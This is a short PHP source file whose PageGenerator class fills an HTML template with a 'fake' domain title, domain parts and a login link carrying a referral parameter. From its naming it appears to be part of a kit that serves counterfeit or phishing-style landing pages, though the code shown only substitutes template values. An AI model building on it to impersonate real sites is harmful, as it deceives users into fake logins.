<?php
require_once("classFake.php");

	class PageGenerator {
		private $PathToTemplate;
		
		function __construct($PathToTemplate){
			$this->PathToTemplate = $PathToTemplate;
		}
		
		public function GenerateIndex($ref){
			$content = file_get_contents($this->PathToTemplate . "/index.html");
			
			global $Fake;
			
			$title = $Fake->s_GetFakeTitle();
			$tempArr = explode(".", $title);
			$domain_name = $tempArr[0] . ".";
			$domain_zone = $tempArr[1];
			
			$content = str_replace
			(
				array("%title%", "%domain_name%", "%domain_zone%", "%login-link%"),
				array($title, $domain_name, $domain_zone, $Fake->s_GetLoginLink() . "&ref=" . $ref),
				$content
			);
			
			return $content;
		}
	}
?>